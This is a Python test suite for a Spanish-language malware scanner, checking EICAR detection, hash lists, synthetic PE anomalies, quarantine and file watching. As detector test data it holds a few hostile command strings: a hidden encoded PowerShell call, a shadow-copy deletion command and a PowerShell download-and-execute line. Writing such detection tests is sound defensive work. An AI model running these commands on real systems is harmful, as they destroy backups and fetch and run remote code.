import os
import struct
import tempfile
import unittest
import zipfile
from pathlib import Path

from nashex_guard import pe, quarantine
from nashex_guard.rules import analyze_command, scan_text
from nashex_guard.scanner import EICAR, load_hashlist, scan_file, scan_paths
from nashex_guard.util import sha256_file, verdict
from nashex_guard.watcher import watch


def build_pe(sections, entry_rva=0x1000) -> bytes:
    """PE mínimo sintético. sections: lista de (nombre, característica, datos)."""
    opt = bytearray(240)
    struct.pack_into("<H", opt, 0, 0x20B)
    struct.pack_into("<I", opt, 16, entry_rva)
    struct.pack_into("<I", opt, 108, 16)
    hdr_size = 0x40 + 4 + 20 + len(opt) + 40 * len(sections)
    raw_ptr = (hdr_size + 0x1FF) & ~0x1FF
    sec_hdrs, bodies = b"", b""
    va = 0x1000
    for name, ch, data in sections:
        sec_hdrs += struct.pack("<8sIIIIIIHHI", name.encode(), len(data), va, len(data), raw_ptr + len(bodies), 0, 0, 0, 0, ch)
        bodies += data
        va += 0x1000
    dos = bytearray(0x40)
    dos[:2] = b"MZ"
    struct.pack_into("<I", dos, 0x3C, 0x40)
    coff = struct.pack("<HHIIIHH", 0x8664, len(sections), 0, 0, 0, len(opt), 0x22)
    blob = bytes(dos) + b"PE\0\0" + coff + bytes(opt) + sec_hdrs
    return blob + b"\0" * (raw_ptr - len(blob)) + bodies


class GuardTests(unittest.TestCase):
    def setUp(self):
        self._tmp = tempfile.TemporaryDirectory()
        self.d = Path(self._tmp.name)

    def tearDown(self):
        self._tmp.cleanup()

    def write(self, name, data: bytes) -> str:
        p = self.d / name
        p.parent.mkdir(parents=True, exist_ok=True)
        p.write_bytes(data)
        return str(p)

    def rules(self, r):
        return {f.rule for f in r.findings}

    def test_eicar_detected(self):
        r = scan_file(self.write("t.txt", EICAR))
        self.assertIn("eicar", self.rules(r))
        self.assertEqual(r.verdict, "MALICIOSO")

    def test_clean_file(self):
        r = scan_file(self.write("a.txt", b"hola mundo"))
        self.assertEqual(r.findings, [])
        self.assertEqual(r.verdict, "LIMPIO")

    def test_hash_match(self):
        p = self.write("x.bin", b"contenido-malo")
        r = scan_file(p, {sha256_file(p)})
        self.assertIn("hash_match", self.rules(r))

    def test_hashlist_parsing(self):
        hl = self.write("h.txt", ("# c\n" + "a" * 64 + " nombre\nbasura\n" + "B" * 64 + "\n").encode())
        self.assertEqual(load_hashlist(hl), {"a" * 64, "b" * 64})

    def test_double_extension_and_disguised_exe(self):
        exe = build_pe([(".text", 0x60000020, b"\x90" * 64)])
        r = scan_file(self.write("factura.pdf.exe", exe))
        self.assertIn("double_ext", self.rules(r))
        r = scan_file(self.write("foto.jpg", exe))
        self.assertIn("disguised_exec", self.rules(r))

    def test_pe_rwx_and_packer(self):
        exe = build_pe([("UPX0", 0xE0000080, b"\0" * 64), (".text", 0xE0000020, b"\x90" * 64)])
        r = scan_file(self.write("p.exe", exe))
        self.assertTrue({"pe_rwx", "pe_packer"} <= self.rules(r))

    def test_pe_high_entropy_exec(self):
        noise = os.urandom(0x4000)
        exe = build_pe([(".text", 0x60000020, noise)])
        r = scan_file(self.write("n.exe", exe))
        self.assertIn("pe_high_entropy_exec", self.rules(r))

    def test_normal_pe_is_clean(self):
        exe = build_pe([(".text", 0x60000020, b"\x90" * 200)])
        self.assertEqual(scan_file(self.write("ok.exe", exe)).findings, [])

    def test_entry_point_outside_sections(self):
        exe = build_pe([(".text", 0x60000020, b"\x90" * 64)], entry_rva=0x90000)
        self.assertIn("pe_entry_outside", self.rules(scan_file(self.write("e.exe", exe))))

    def test_malformed_pe_does_not_crash(self):
        for blob in (b"MZ", b"MZ" + b"\0" * 100, b"MZ" + b"\xff" * 4096):
            scan_file(self.write("bad.exe", blob))

    def test_script_patterns(self):
        enc = "powershell -nop -w hidden -enc " + "QUJD" * 10
        self.assertIn("ps_encoded", {f.rule for f in scan_text(enc)})
        self.assertEqual(verdict(scan_text("vssadmin delete shadows /all /quiet")), "MALICIOSO")
        self.assertEqual(scan_text("echo hola"), [])

    def test_script_file(self):
        r = scan_file(self.write("s.ps1", b"IEX (New-Object Net.WebClient).DownloadString('http://x/y')"))
        self.assertIn("ps_download_exec", self.rules(r))

    def test_command_in_temp(self):
        rules = {f.rule for f in analyze_command(r'"C:\Users\a\AppData\Local\Temp\x.exe" /s')}
        self.assertIn("exe_in_user_dir", rules)
        self.assertEqual(analyze_command(r"C:\Windows\System32\svchost.exe -k netsvcs"), [])

    def test_zip_encrypted_exec_and_macros(self):
        p = self.d / "doc.docx"
        with zipfile.ZipFile(p, "w") as z:
            z.writestr("word/vbaProject.bin", b"x")
        self.assertIn("office_macros", self.rules(scan_file(str(p))))

    def test_scan_paths_and_skip_symlink(self):
        self.write("sub/e.txt", EICAR)
        link = self.d / "link.txt"
        try:
            link.symlink_to(self.d / "sub/e.txt")
        except OSError:
            pass
        results, stats = scan_paths([str(self.d)], progress=False)
        self.assertEqual(len([r for r in results if "eicar" in self.rules(r)]), 1)

    def test_quarantine_roundtrip(self):
        q = self.d / "q"
        src = self.write("evil.txt", EICAR)
        dest = quarantine.add(src, "test", q)
        self.assertFalse(os.path.exists(src))
        self.assertTrue(dest.exists())
        item = quarantine.list_items(q)[0]
        self.assertEqual(quarantine.restore(item["id"], q), src)
        self.assertEqual(Path(src).read_bytes(), EICAR)

    def test_quarantine_refuses_system_paths_and_overwrite(self):
        with self.assertRaises(PermissionError):
            quarantine.add("/etc/hostname", "x", self.d / "q")
        q = self.d / "q"
        src = self.write("a.txt", b"1")
        quarantine.add(src, "t", q)
        self.write("a.txt", b"2")
        with self.assertRaises(FileExistsError):
            quarantine.restore(quarantine.list_items(q)[0]["id"], q)
        self.assertEqual(Path(src).read_bytes(), b"2")

    def test_watch_detects_new_file(self):
        import threading, time
        found = []
        t = threading.Thread(target=lambda: watch([str(self.d)], found.append, interval=0.2, cycles=8))
        t.start()
        time.sleep(0.3)
        self.write("nuevo.txt", EICAR)
        t.join()
        self.assertEqual([r.path for r in found], [str(self.d / "nuevo.txt")])


if __name__ == "__main__":
    unittest.main()
